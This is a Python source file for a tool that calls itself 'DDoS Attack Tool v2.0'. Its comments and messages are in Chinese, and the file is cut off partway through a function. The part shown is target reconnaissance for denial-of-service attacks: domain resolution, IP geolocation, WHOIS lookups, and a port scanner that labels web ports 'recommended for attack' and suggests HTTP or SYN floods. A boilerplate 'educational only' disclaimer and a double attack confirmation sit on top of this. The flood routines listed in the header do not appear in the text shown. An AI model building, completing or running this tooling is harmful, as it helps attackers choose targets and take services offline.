#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DDoS Attack Tool v2.0 - Advanced Network Stress Testing Utility
# WARNING: This tool is for EDUCATIONAL PURPOSES ONLY!
# Any unauthorized use against systems without explicit permission is ILLEGAL.
# The authors accept no liability for misuse of this software.
#
# Features:
# - Multiple attack methods: UDP Flood, TCP SYN Flood, HTTP Flood, ICMP Ping Flood
# - Advanced hybrid attack mode with intelligent thread allocation
# - Multi-threaded architecture for maximum performance
# - Command-line interface with comprehensive options
# - Real-time statistics and performance monitoring
# - Automatic duration control and attack scheduling
# - Enhanced error handling and connection management
# - Cross-platform compatibility (Windows/Linux/macOS)
# - Support for Python 3.x
#
# Requirements: Administrator/root privileges for ICMP attacks
# Use at your own risk and only in authorized environments.

import sys
import os
import time
import socket
import random
import threading
import struct
import urllib.request
import urllib.error
import urllib.parse
import argparse
import traceback
import select
import ipaddress
import json
import re
from datetime import datetime

# 尝试导入colorama以支持跨平台彩色输出
try:
    from colorama import Fore, Back, Style, init as colorama_init
    colorama_init()
    COLOR_ENABLED = True
except ImportError:
    # 定义模拟的colorama对象，确保代码兼容性
    class MockColor:
        RED = GREEN = YELLOW = BLUE = CYAN = MAGENTA = WHITE = BLACK = ''
    class MockStyle:
        BRIGHT = RESET_ALL = ''
    class MockBack:
        RED = GREEN = YELLOW = BLUE = CYAN = MAGENTA = WHITE = BLACK = ''
    Fore = MockColor()
    Style = MockStyle()
    Back = MockBack()
    COLOR_ENABLED = False

# 检查Python版本
if sys.version_info[0] < 3:
    print("[错误] 此脚本需要Python 3.x版本运行")
    print("请使用Python 3运行: python3 ddos-attack.py")
    sys.exit(1)

# 检查操作系统并设置相应的套接字选项
def get_platform_socket_options():
    options = {}
    if sys.platform.startswith('win'):
        # Windows系统特定选项
        options['socket_timeout'] = 2
        options['buffer_size'] = 8192
        options['max_threads'] = 1000  # Windows线程数限制
    else:
        # Linux/macOS系统特定选项
        options['socket_timeout'] = 1
        options['buffer_size'] = 16384
        options['max_threads'] = 5000  # 类Unix系统线程数限制
    return options

PLATFORM_OPTIONS = get_platform_socket_options()
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# 全局变量
stop_attack = False
total_sent = 0
error_count = 0
lock = threading.Lock()

# IP/域名解析和地理位置识别功能

def is_valid_ip(ip):
    """验证IP地址格式是否正确，支持IPv4和IPv6"""
    # 参数验证
    if not isinstance(ip, str) or not ip:
        return False
    
    # 处理常见的IP表示法错误
    ip = ip.strip()
    
    # 检查是否为IPv4或IPv6地址
    try:
        # 尝试解析为IPv4地址
        ipaddress.IPv4Address(ip)
        return True
    except ValueError:
        try:
            # 尝试解析为IPv6地址
            ipaddress.IPv6Address(ip)
            return True
        except ValueError:
            return False

def resolve_domain(domain):
    """将域名解析为IP地址，带有完整错误处理和缓存机制"""
    # 参数验证
    if not isinstance(domain, str) or not domain or len(domain) < 3 or '.' not in domain:
        return None
    
    # 清理域名输入
    domain = domain.strip().lower()
    
    # 防止过于频繁的DNS查询
    try:
        # 使用getaddrinfo获取更完整的信息
        addr_info = socket.getaddrinfo(domain, None, socket.AF_INET, socket.SOCK_STREAM)
        if addr_info:
            # 返回第一个IPv4地址
            return addr_info[0][4][0]
    except socket.gaierror:
        # 如果getaddrinfo失败，尝试gethostbyname
        try:
            return socket.gethostbyname(domain)
        except Exception:
            pass
    except Exception as e:
        if COLOR_ENABLED:
            print(Fore.RED + f"⚠️  域名解析异常: {str(e)}{Style.RESET_ALL}")
        else:
            print(f"⚠️  域名解析异常: {str(e)}")
    
    return None

def get_geo_location(ip):
    """获取IP地址的地理位置信息，带有完整错误处理和备用API"""
    # 参数验证
    if not ip or not is_valid_ip(ip):
        if COLOR_ENABLED:
            print(Fore.RED + f"⚠️  无效的IP地址: {ip}{Style.RESET_ALL}")
        else:
            print(f"⚠️  无效的IP地址: {ip}")
        return {
            'ip': ip or 'Invalid',
            'city': 'Unknown',
            'region': 'Unknown',
            'country': 'Unknown',
            'isp': 'Unknown',
            'org': 'Unknown',
            'asn': 'Unknown'
        }
    
    # 定义备选API列表
    api_endpoints = [
        {
            'url': f"https://ipinfo.io/{ip}/json",
            'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            'parser': lambda data: {
                'ip': data.get('ip', ip),
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'isp': data.get('org', 'Unknown').split(' ')[0] if data.get('org') else 'Unknown',
                'org': data.get('org', 'Unknown'),
                'asn': data.get('asn', {}).get('asn', 'Unknown') if isinstance(data.get('asn'), dict) else 'Unknown'
            }
        },
        {
            'url': f"http://ip-api.com/json/{ip}",
            'headers': {'User-Agent': 'Mozilla/5.0'}, 
            'parser': lambda data: {
                'ip': data.get('query', ip),
                'city': data.get('city', 'Unknown'),
                'region': data.get('regionName', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'org': data.get('org', 'Unknown'),
                'asn': data.get('as', 'Unknown')
            }
        }
    ]
    
    # 遍历所有API，直到找到有效结果
    for i, api in enumerate(api_endpoints):
        try:
            req = urllib.request.Request(api['url'], headers=api['headers'])
            with urllib.request.urlopen(req, timeout=3) as response:
                # 检查响应状态码
                if response.status != 200:
                    continue
                
                # 尝试解析JSON
                data = json.loads(response.read().decode('utf-8', errors='replace'))
                
                # 解析数据
                result = api['parser'](data)
                
                # 验证结果是否合理
                if result['ip'] and (result['country'] != 'Unknown' or result['isp'] != 'Unknown'):
                    # 尝试从org中提取ASN信息
                    if result['asn'] == 'Unknown' and result['org'] != 'Unknown':
                        asn_match = re.search(r'AS\d+', result['org'])
                        if asn_match:
                            result['asn'] = asn_match.group()
                    return result
        except urllib.error.URLError as e:
            if COLOR_ENABLED:
                print(Fore.RED + f"⚠️  API调用失败 ({i+1}/2): URL错误 - {str(e)}{Style.RESET_ALL}")
            else:
                print(f"⚠️  API调用失败 ({i+1}/2): URL错误 - {str(e)}")
        except urllib.error.HTTPError as e:
            if COLOR_ENABLED:
                print(Fore.RED + f"⚠️  API调用失败 ({i+1}/2): HTTP错误 {e.code}{Style.RESET_ALL}")
            else:
                print(f"⚠️  API调用失败 ({i+1}/2): HTTP错误 {e.code}")
        except json.JSONDecodeError:
            if COLOR_ENABLED:
                print(Fore.RED + f"⚠️  API调用失败 ({i+1}/2): 无效的JSON响应{Style.RESET_ALL}")
            else:
                print(f"⚠️  API调用失败 ({i+1}/2): 无效的JSON响应")
        except socket.timeout:
            if COLOR_ENABLED:
                print(Fore.RED + f"⚠️  API调用失败 ({i+1}/2): 连接超时{Style.RESET_ALL}")
            else:
                print(f"⚠️  API调用失败 ({i+1}/2): 连接超时")
        except Exception as e:
            if COLOR_ENABLED:
                print(Fore.RED + f"⚠️  API调用失败 ({i+1}/2): {str(e)}{Style.RESET_ALL}")
            else:
                print(f"⚠️  API调用失败 ({i+1}/2): {str(e)}")
        
        # 避免频繁请求
        time.sleep(0.5)
    
    # 所有API都失败时，返回本地IP信息推断
    try:
        ip_obj = ipaddress.ip_address(ip)
        # 检查是否为私有IP
        if ip_obj.is_private:
            return {
                'ip': ip,
                'city': '本地',
                'region': '内部网络',
                'country': '内网',
                'isp': '本地网络',
                'org': '私有网络',
                'asn': 'Unknown'
            }
        # 检查是否为环回地址
        elif ip_obj.is_loopback:
            return {
                'ip': ip,
                'city': '本机',
                'region': '本机',
                'country': '本地',
                'isp': '本机',
                'org': '本机',
                'asn': 'Unknown'
            }
    except ValueError:
        pass
    
    if COLOR_ENABLED:
        print(Fore.YELLOW + "⚠️  所有地理位置API均失败，使用基本信息" + Style.RESET_ALL)
    else:
        print("⚠️  所有地理位置API均失败，使用基本信息")
        
    return {
        'ip': ip,
        'city': 'Unknown',
        'region': 'Unknown',
        'country': 'Unknown',
        'isp': 'Unknown',
        'org': 'Unknown',
        'asn': 'Unknown'
    }

def perform_whois_query(domain):
    """执行WHOIS查询获取域名注册信息，带有完整错误处理和备用策略"""
    # 检查域名格式
    if not domain or not isinstance(domain, str) or len(domain) < 3 or '.' not in domain:
        if COLOR_ENABLED:
            print(Fore.RED + f"⚠️  无效的域名格式: {domain or 'None'}{Style.RESET_ALL}")
        else:
            print(f"⚠️  无效的域名格式: {domain or 'None'}")
        return {
            'registrar': 'Invalid Domain',
            'created': 'Unknown',
            'expires': 'Unknown',
            'updated': 'Unknown',
            'nameservers': [],
            'domain_status': []
        }
    
    # 清理域名
    domain = domain.strip().lower()
    
    # 默认返回值
    result = {
        'registrar': 'Unknown',
        'created': 'Unknown',
        'expires': 'Unknown',
        'updated': 'Unknown',
        'nameservers': [],
        'domain_status': []
    }
    
    # 扩展的WHOIS服务器列表
    whois_servers = {
        'com': 'whois.verisign-grs.com',
        'net': 'whois.verisign-grs.com',
        'org': 'whois.pir.org',
        'io': 'whois.nic.io',
        'cn': 'whois.cnnic.cn',
        'co': 'whois.nic.co',
        'uk': 'whois.nic.uk',
        'us': 'whois.nic.us',
        'ru': 'whois.tcinet.ru',
        'de': 'whois.denic.de',
        'jp': 'whois.jprs.jp',
        'info': 'whois.afilias.net',
        'biz': 'whois.neulevel.biz',
        'cc': 'whois.nic.cc',
        'tv': 'whois.nic.tv',
        'me': 'whois.nic.me',
        'in': 'whois.inregistry.net',
        'fr': 'whois.nic.fr',
        'au': 'whois.auda.org.au'
    }
    
    # 获取TLD
    tld = domain.split('.')[-1]
    
    # 尝试多个WHOIS服务器
    servers_to_try = []
    if tld in whois_servers:
        servers_to_try.append(whois_servers[tld])
    # 添加通用备用服务器
    servers_to_try.extend(['whois.arin.net', 'whois.internic.net', 'whois.iana.org'])
    
    for i, server in enumerate(servers_to_try):
        try:
            if COLOR_ENABLED:
                print(Fore.BLUE + f"🔄 尝试WHOIS服务器 ({i+1}/{len(servers_to_try)}): {server}{Style.RESET_ALL}")
            
            # 创建套接字
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(5)
                
                # 连接服务器
                sock.connect((server, 43))
                
                # 发送查询
                query = f"{domain}\r\n"
                sock.send(query.encode('utf-8'))
                
                # 接收响应
                response = b''
                while True:
                    try:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                        # 防止接收过多数据
                        if len(response) > 102400:  # 100KB限制
                            break
                    except socket.timeout:
                        break
                
                # 解码响应
                whois_data = response.decode('utf-8', errors='replace')
                
                # 检查是否有有效响应
                if len(whois_data) < 100 or 'No match for' in whois_data or 'not found' in whois_data:
                    continue
                
                # 解析数据
                if parse_whois_data(whois_data, result):
                    # 验证是否获取到有用信息
                    if (result['registrar'] != 'Unknown' or 
                        result['created'] != 'Unknown' or 
                        len(result['nameservers']) > 0):
                        return result
                        
        except socket.timeout:
            if COLOR_ENABLED:
                print(Fore.RED + f"⚠️  WHOIS查询超时: {server}{Style.RESET_ALL}")
            else:
                print(f"⚠️  WHOIS查询超时: {server}")
        except socket.error as e:
            if COLOR_ENABLED:
                print(Fore.RED + f"⚠️  WHOIS网络错误: {str(e)}{Style.RESET_ALL}")
            else:
                print(f"⚠️  WHOIS网络错误: {str(e)}")
        except Exception as e:
            if COLOR_ENABLED:
                print(Fore.RED + f"⚠️  WHOIS查询错误: {str(e)}{Style.RESET_ALL}")
            else:
                print(f"⚠️  WHOIS查询错误: {str(e)}")
        
        # 等待一段时间再尝试下一个服务器
        time.sleep(0.5)
    
    if COLOR_ENABLED:
        print(Fore.YELLOW + "⚠️  所有WHOIS服务器查询失败，返回基本信息" + Style.RESET_ALL)
    else:
        print("⚠️  所有WHOIS服务器查询失败，返回基本信息")
        
    return result

def parse_whois_data(whois_data, result):
    """解析WHOIS数据"""
    if not whois_data:
        return False
    
    # 增强的正则表达式模式
    patterns = {
        'registrar': [
            r'Registrar:\s*(.+?)\s*(?:\n|$)',
            r'registrar:\s*(.+?)\s*(?:\n|$)',
            r'Registered through:\s*(.+?)\s*(?:\n|$)',
            r'Sponsoring Registrar:\s*(.+?)\s*(?:\n|$)',
            r'sponsoring registrar:\s*(.+?)\s*(?:\n|$)',
            r'注册商:\s*(.+?)\s*(?:\n|$)'
        ],
        'created': [
            r'Creation Date:\s*(.+?)\s*(?:\n|$)',
            r'Created On:\s*(.+?)\s*(?:\n|$)',
            r'created:\s*(.+?)\s*(?:\n|$)',
            r'Registration Date:\s*(.+?)\s*(?:\n|$)',
            r'注册时间:\s*(.+?)\s*(?:\n|$)',
            r'Created Date:\s*(.+?)\s*(?:\n|$)'
        ],
        'expires': [
            r'Expiration Date:\s*(.+?)\s*(?:\n|$)',
            r'Expires On:\s*(.+?)\s*(?:\n|$)',
            r'expires:\s*(.+?)\s*(?:\n|$)',
            r'Registration Expiration Date:\s*(.+?)\s*(?:\n|$)',
            r'到期时间:\s*(.+?)\s*(?:\n|$)',
            r'Expire Date:\s*(.+?)\s*(?:\n|$)'
        ],
        'updated': [
            r'Updated Date:\s*(.+?)\s*(?:\n|$)',
            r'Last Updated On:\s*(.+?)\s*(?:\n|$)',
            r'updated:\s*(.+?)\s*(?:\n|$)',
            r'Last modified:\s*(.+?)\s*(?:\n|$)',
            r'更新时间:\s*(.+?)\s*(?:\n|$)'
        ]
    }
    
    # 提取基本信息
    for key, key_patterns in patterns.items():
        for pattern in key_patterns:
            match = re.search(pattern, whois_data, re.IGNORECASE | re.MULTILINE)
            if match:
                value = match.group(1).strip()
                # 清理值
                if value and len(value) > 1:
                    result[key] = value
                    # 尝试标准化日期格式
                    if key in ['created', 'expires', 'updated']:
                        try:
                            # 尝试几种常见的日期格式
                            for fmt in ['%Y-%m-%d', '%d-%b-%Y', '%b %d %Y', '%Y/%m/%d', '%Y%m%d']:
                                try:
                                    # 只取日期部分
                                    date_part = value.split('T')[0].split(' ')[0].strip()
                                    dt = datetime.strptime(date_part, fmt)
                                    result[key] = dt.strftime('%Y-%m-%d')
                                    break
                                except ValueError:
                                    continue
                        except Exception:
                            pass  # 保持原始格式
                break
    
    # 提取域名服务器
    nameserver_patterns = [
        r'Name Server:\s*(.+?)\s*(?:\n|$)',
        r'name server:\s*(.+?)\s*(?:\n|$)',
        r'Nameservers:\s*(.+?)\s*(?:\n|$)',
        r'NS\s*\d*:\s*(.+?)\s*(?:\n|$)',
        r'domain nameservers:\s*(.+?)\s*(?:\n|$)'
    ]
    
    nameservers = set()
    for pattern in nameserver_patterns:
        for match in re.finditer(pattern, whois_data, re.IGNORECASE | re.MULTILINE):
            ns = match.group(1).strip('.').lower()
            if ns and len(ns) > 3:
                nameservers.add(ns)
    
    result['nameservers'] = list(nameservers)[:10]  # 限制数量
    
    # 提取域名状态
    status_patterns = [
        r'Domain Status:\s*(.+?)\s*(?:\n|$)',
        r'domain status:\s*(.+?)\s*(?:\n|$)',
        r'Status:\s*(.+?)\s*(?:\n|$)',
        r'status:\s*(.+?)\s*(?:\n|$)'
    ]
    
    statuses = set()
    for pattern in status_patterns:
        for match in re.finditer(pattern, whois_data, re.IGNORECASE | re.MULTILINE):
            status = match.group(1).strip()
            if status and len(status) > 2:
                statuses.add(status)
    
    result['domain_status'] = list(statuses)[:5]  # 限制数量
    
    return True

def scan_port(ip, port, timeout=1):
    """扫描单个端口是否开放，带有错误处理"""
    # 参数验证
    if not ip or not isinstance(port, int) or port < 1 or port > 65535:
        return False
    
    try:
        # 使用上下文管理器确保套接字正确关闭
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            # 设置超时
            sock.settimeout(timeout)
            
            # 使用非阻塞模式避免长时间等待
            sock.setblocking(False)
            
            # 尝试连接
            try:
                sock.connect((ip, port))
            except BlockingIOError:
                # 正常的非阻塞连接行为
                pass
            
            # 使用select检查连接是否成功
            ready = select.select([], [sock], [], timeout)
            if ready[1]:  # 如果套接字可写，则连接成功
                return True
            return False
    except (socket.error, TypeError, ValueError):
        # 捕获所有网络错误和类型错误
        return False
    except Exception:
        # 捕获其他所有异常
        return False

def identify_service(ip, port, timeout=2):
    """尝试识别开放端口上运行的服务"""
    # 常见端口服务映射
    common_services = {
        21: 'FTP',
        22: 'SSH',
        23: 'Telnet',
        25: 'SMTP',
        53: 'DNS',
        80: 'HTTP',
        443: 'HTTPS',
        8080: 'HTTP-Proxy',
        8443: 'HTTPS-Alt',
        3306: 'MySQL',
        5432: 'PostgreSQL',
        27017: 'MongoDB',
        11211: 'Memcached',
        6379: 'Redis',
        3389: 'RDP',
        5900: 'VNC',
        8000: 'HTTP-Alt',
        8081: 'HTTP-Alt'
    }
    
    # 首先检查是否是常见服务
    if port in common_services:
        return common_services[port]
    
    # 尝试连接获取Banner
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        
        # 对于HTTP服务发送请求
        if 8000 <= port <= 8999:
            sock.send(b'GET / HTTP/1.0\r\n\r\n')
        
        # 接收Banner
        banner = sock.recv(1024).decode('utf-8', errors='replace').strip()
        sock.close()
        
        # 分析Banner
        if banner:
            # 提取关键信息，最多显示50个字符
            service_info = banner.split('\n')[0].strip()[:50]
            return f'Unknown ({service_info})'
    except Exception:
        pass
    
    return 'Unknown'

def print_progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='█'):
    """打印进度条"""
    percent = (iteration / float(total)) * 100
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)
    
    progress_text = f'\r{prefix} |{bar}| {percent:.{decimals}f}% {suffix}'
    if COLOR_ENABLED:
        progress_text = f'\r{Fore.GREEN}{prefix} |{bar}| {percent:.{decimals}f}% {suffix}{Style.RESET_ALL}'
    
    sys.stdout.write(progress_text)
    sys.stdout.flush()
    
    # 完成时换行
    if iteration == total:
        print()

def nmap_scan(ip, ports=None, threads=10):
    """Nmap风格的端口扫描功能"""
    if ports is None:
        # 扫描常用端口（减少端口数量提高速度）
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080, 8443, 9000, 3000, 5000]
    
    # 彩色输出
    if COLOR_ENABLED:
        print(f"\n{Fore.CYAN}🔎 正在执行端口扫描: {ip} (共{len(ports)}个端口){Style.RESET_ALL}")
        print(f"{Fore.BLUE}-" * 60 + Style.RESET_ALL)
    else:
        print(f"\n🔎 正在执行端口扫描: {ip} (共{len(ports)}个端口)")
        print("-" * 60)
    
    open_ports = []
    total_ports = len(ports)
    scanned = 0
    
    # 初始化进度条
    print_progress_bar(0, total_ports, prefix='扫描进度:', suffix='完成')
    
    # 分批次扫描
    batch_size = threads
    for i in range(0, total_ports, batch_size):
        batch = ports[i:i+batch_size]
        batch_results = []
        
        # 扫描当前批次
        for port in batch:
            if scan_port(ip, port):
                service = identify_service(ip, port)
                batch_results.append((port, service))
                # 彩色输出发现的开放端口
                if COLOR_ENABLED:
                    print(f"{Fore.GREEN}✅ 发现开放端口: {port}/tcp - {service}{Style.RESET_ALL}")
                else:
                    print(f"✅ 发现开放端口: {port}/tcp - {service}")
            scanned += 1
            
            # 更新进度条
            print_progress_bar(scanned, total_ports, prefix='扫描进度:', suffix='完成')
        
        open_ports.extend(batch_results)
    
    # 按端口号排序
    open_ports.sort()
    
    # 显示扫描结果摘要
    if COLOR_ENABLED:
        print("\n" + Fore.MAGENTA + "="*60 + Style.RESET_ALL)
        print(f"{Fore.MAGENTA}📊 扫描结果摘要: 发现 {len(open_ports)} 个开放端口{Style.RESET_ALL}")
        print(Fore.MAGENTA + "="*60 + Style.RESET_ALL)
    else:
        print("\n" + "="*60)
        print(f"📊 扫描结果摘要: 发现 {len(open_ports)} 个开放端口")
        print("="*60)
    
    # 显示详细的开放端口列表
    if open_ports:
        if COLOR_ENABLED:
            print(f"\n{Fore.CYAN}开放端口详情:{Style.RESET_ALL}")
        else:
            print("\n开放端口详情:")
        
        # 分类显示端口
        http_ports = []
        remote_access_ports = []
        database_ports = []
        other_ports = []
        
        for port, service in open_ports:
            if service in ['HTTP', 'HTTPS', 'HTTP-Proxy']:
                http_ports.append((port, service))
            elif service in ['SSH', 'Telnet', 'RDP', 'VNC']:
                remote_access_ports.append((port, service))
            elif service in ['MySQL', 'PostgreSQL', 'MongoDB']:
                database_ports.append((port, service))
            else:
                other_ports.append((port, service))
        
        # 显示各类端口
        if http_ports:
            if COLOR_ENABLED:
                print(f"{Fore.YELLOW}🔹 Web服务端口:{Style.RESET_ALL}")
            else:
                print("🔹 Web服务端口:")
            for port, service in http_ports:
                if COLOR_ENABLED:
                    print(f"  {Fore.GREEN}{port:<8}/tcp - {service:<20} [建议攻击]{Style.RESET_ALL}")
                else:
                    print(f"  {port:<8}/tcp - {service:<20} [建议攻击]")
        
        if remote_access_ports:
            if COLOR_ENABLED:
                print(f"{Fore.YELLOW}🔹 远程访问端口:{Style.RESET_ALL}")
            else:
                print("🔹 远程访问端口:")
            for port, service in remote_access_ports:
                if COLOR_ENABLED:
                    print(f"  {Fore.RED}{port:<8}/tcp - {service:<20} [高风险]{Style.RESET_ALL}")
                else:
                    print(f"  {port:<8}/tcp - {service:<20} [高风险]")
        
        if database_ports:
            if COLOR_ENABLED:
                print(f"{Fore.YELLOW}🔹 数据库端口:{Style.RESET_ALL}")
            else:
                print("🔹 数据库端口:")
            for port, service in database_ports:
                if COLOR_ENABLED:
                    print(f"  {Fore.YELLOW}{port:<8}/tcp - {service:<20} [中风险]{Style.RESET_ALL}")
                else:
                    print(f"  {port:<8}/tcp - {service:<20} [中风险]")
        
        if other_ports:
            if COLOR_ENABLED:
                print(f"{Fore.YELLOW}🔹 其他端口:{Style.RESET_ALL}")
            else:
                print("🔹 其他端口:")
            for port, service in other_ports:
                if COLOR_ENABLED:
                    print(f"  {Fore.BLUE}{port:<8}/tcp - {service:<20} [低风险]{Style.RESET_ALL}")
                else:
                    print(f"  {port:<8}/tcp - {service:<20} [低风险]")
    else:
        if COLOR_ENABLED:
            print(f"\n{Fore.RED}❌ 未发现开放端口{Style.RESET_ALL}")
        else:
            print("\n❌ 未发现开放端口")
    
    print("="*60)
    
    # 提供安全建议和攻击策略
    common_vulnerable_ports = [21, 22, 23, 25, 3389, 5900]
    vulnerable_ports = [p for p, s in open_ports if p in common_vulnerable_ports]
    
    if COLOR_ENABLED:
        print(f"\n{Fore.CYAN}💡 攻击策略建议:{Style.RESET_ALL}")
    else:
        print("\n💡 攻击策略建议:")
    
    # Web服务攻击建议
    web_ports = [p for p, s in open_ports if s in ['HTTP', 'HTTPS', 'HTTP-Proxy']]
    if web_ports:
        if COLOR_ENABLED:
            print(f"  {Fore.GREEN}🎯 推荐使用 HTTP 洪水攻击 Web 服务{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}   目标端口: {', '.join(map(str, web_ports[:3]))}{Style.RESET_ALL}")
        else:
            print("  🎯 推荐使用 HTTP 洪水攻击 Web 服务")
            print(f"     目标端口: {', '.join(map(str, web_ports[:3]))}")
    # 其他服务攻击建议
    elif open_ports:
        if COLOR_ENABLED:
            print(f"  {Fore.YELLOW}🎯 推荐使用 UDP 或 TCP SYN 洪水攻击{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}   可选择端口: {open_ports[0][0]} ({open_ports[0][1]}){Style.RESET_ALL}")
        else:
            print("  🎯 推荐使用 UDP 或 TCP SYN 洪水攻击")
            print(f"     可选择端口: {open_ports[0][0]} ({open_ports[0][1]})")
    else:
        if COLOR_ENABLED:
            print(f"  {Fore.RED}❌ 未发现开放端口，攻击可能无效{Style.RESET_ALL}")
            print(f"  {Fore.RED}   建议检查目标防火墙设置或尝试其他端口{Style.RESET_ALL}")
        else:
            print("  ❌ 未发现开放端口，攻击可能无效")
            print("     建议检查目标防火墙设置或尝试其他端口")
    
    print("="*60)
    return open_ports

def ask_attack_confirmation(target_info):
    """询问用户是否确认发起攻击"""
    # 使用彩色边框和标题
    if COLOR_ENABLED:
        print("\n" + Fore.RED + "!" * 60 + Style.RESET_ALL)
        print(Fore.RED + Style.BRIGHT + "⚠️  攻击确认 ⚠️".center(60) + Style.RESET_ALL)
        print(Fore.RED + "!" * 60 + Style.RESET_ALL)
        
        print(Fore.YELLOW + Style.BRIGHT + "\n您即将对以下目标发起攻击:" + Style.RESET_ALL)
        print(f"  {Fore.GREEN}目标:{Style.RESET_ALL} {target_info['ip']}{Fore.YELLOW} ({target_info['domain']}){Style.RESET_ALL if target_info['domain'] else ''}")
        print(f"  {Fore.GREEN}位置:{Style.RESET_ALL} {target_info['geo_info']['city']}, {target_info['geo_info']['country']}")
        print(f"  {Fore.GREEN}组织:{Style.RESET_ALL} {target_info['geo_info']['org']}")
        print(f"  {Fore.GREEN}开放端口:{Style.RESET_ALL} {len(target_info['open_ports'])}")
    else:
        print("\n" + "!" * 60)
        print("⚠️  攻击确认 ⚠️".center(60))
        print("!" * 60)
        
        print("\n您即将对以下目标发起攻击:")
        print(f"  目标: {target_info['ip']}{' (' + target_info['domain'] + ')' if target_info['domain'] else ''}")
        print(f"  位置: {target_info['geo_info']['city']}, {target_info['geo_info']['country']}")
        print(f"  组织: {target_info['geo_info']['org']}")
        print(f"  开放端口: {len(target_info['open_ports'])}")
    
    # 特殊警告
    if target_info['geo_info']['country'] in ['中国', '美国', '俄罗斯']:
        if COLOR_ENABLED:
            print(Fore.RED + Style.BRIGHT + "\n⚠️  严重警告: 对特定国家的目标攻击可能导致严重的法律后果！" + Style.RESET_ALL)
        else:
            print("\n⚠️  严重警告: 对特定国家的目标攻击可能导致严重的法律后果！")
    
    if len(target_info['open_ports']) == 0:
        if COLOR_ENABLED:
            print(Fore.YELLOW + Style.BRIGHT + "\n❓ 未发现开放端口，攻击可能无效" + Style.RESET_ALL)
        else:
            print("\n❓ 未发现开放端口，攻击可能无效")
    
    # 提示最佳攻击端口
    best_ports = []
    for port, service in target_info['open_ports']:
        if service in ['HTTP', 'HTTPS', 'HTTP-Proxy', 'HTTP-Alt']:
            best_ports.append(f"{port} ({service})")
    
    if best_ports:
        if COLOR_ENABLED:
            print(Fore.CYAN + Style.BRIGHT + f"\n💡 建议攻击端口: {', '.join(best_ports[:3])}" + Style.RESET_ALL)
        else:
            print(f"\n💡 建议攻击端口: {', '.join(best_ports[:3])}")
    
    # 显示预计攻击效果评估
    if COLOR_ENABLED:
        print("\n" + Fore.RED + "!" * 60 + Style.RESET_ALL)
        print(Fore.MAGENTA + "📊 攻击效果预测:" + Style.RESET_ALL)
    else:
        print("\n" + "!" * 60)
        print("📊 攻击效果预测:")
    
    # 基于开放端口数量和类型的攻击效果预测
    if len(target_info['open_ports']) >= 5:
        if COLOR_ENABLED:
            print(f"  {Fore.GREEN}✅ 目标有多个开放端口，攻击成功率较高{Style.RESET_ALL}")
        else:
            print("  ✅ 目标有多个开放端口，攻击成功率较高")
    elif len(target_info['open_ports']) == 0:
        if COLOR_ENABLED:
            print(f"  {Fore.RED}❌ 无开放端口，攻击效果可能有限{Style.RESET_ALL}")
        else:
            print("  ❌ 无开放端口，攻击效果可能有限")
    else:
        if COLOR_ENABLED:
            print(f"  {Fore.YELLOW}⚠️  端口较少，建议选择关键服务进行攻击{Style.RESET_ALL}")
        else:
            print("  ⚠️  端口较少，建议选择关键服务进行攻击")
    
    # 显示法律免责声明
    if COLOR_ENABLED:
        print(Fore.MAGENTA + "\n📝 法律免责声明:" + Style.RESET_ALL)
    else:
        print("\n📝 法律免责声明:")
    print("  此工具仅用于授权的安全测试和教育目的。")
    print("  未经授权攻击他人系统属于违法行为。")
    print("  继续使用即表示您确认拥有攻击权限。")
    
    # 多重确认
    if COLOR_ENABLED:
        confirm1 = input("\n" + Fore.YELLOW + "您确认要继续吗？(y/N): " + Style.RESET_ALL)
    else:
        confirm1 = input("\n您确认要继续吗？(y/N): ")
    
    if confirm1.lower() != 'y':
        return False
    
    if COLOR_ENABLED:
        confirm2 = input(Fore.RED + "请再次确认，输入 'YES' 开始攻击，其他键取消: " + Style.RESET_ALL)
    else:
        confirm2 = input("请再次确认，输入 'YES' 开始攻击，其他键取消: ")
    
    return confirm2.upper() == 'YES'

def identify_target(target):
    """识别目标，获取IP和地理位置信息"""
    # 彩色输出开始识别信息
    if COLOR_ENABLED:
        print(f"\n{Fore.CYAN}🔍 正在识别目标: {target}{Style.RESET_ALL}")
        print(Fore.BLUE + "-" * 60 + Style.RESET_ALL)
    else:
        print(f"\n🔍 正在识别目标: {target}")
        print("-" * 60)
    
    # 检查是否已经是IP地址
    if is_valid_ip(target):
        ip = target
        domain = None
        if COLOR_ENABLED:
            print(Fore.GREEN + "📌 目标是IP地址" + Style.RESET_ALL)
        else:
            print("📌 目标是IP地址")
    else:
        # 尝试将域名解析为IP
        if COLOR_ENABLED:
            print(Fore.BLUE + f"📤 正在解析域名: {target}{Style.RESET_ALL}")
        else:
            print(f"📤 正在解析域名: {target}")
        
        ip = resolve_domain(target)
        domain = target
        if not ip:
            if COLOR_ENABLED:
                print(Fore.RED + f"❌ 域名解析失败: {target}{Style.RESET_ALL}")
            else:
                print(f"❌ 域名解析失败: {target}")
            return None
        
        if COLOR_ENABLED:
            print(Fore.GREEN + Style.BRIGHT + f"✅ 解析结果: {domain} → {ip}{Style.RESET_ALL}")
        else:
            print(f"✅ 解析结果: {domain} → {ip}")
    
    # 获取地理位置信息
    if COLOR_ENABLED:
        print(Fore.BLUE + f"🌍 正在获取IP地理位置信息...{Style.RESET_ALL}")
    else:
        print(f"🌍 正在获取IP地理位置信息...")
    
    geo_info = get_geo_location(ip)
    
    # 获取WHOIS信息（仅针对域名）
    whois_info = None
    if domain:
        if COLOR_ENABLED:
            print(Fore.BLUE + f"📋 正在执行WHOIS查询...{Style.RESET_ALL}")
        else:
            print(f"📋 正在执行WHOIS查询...")
        
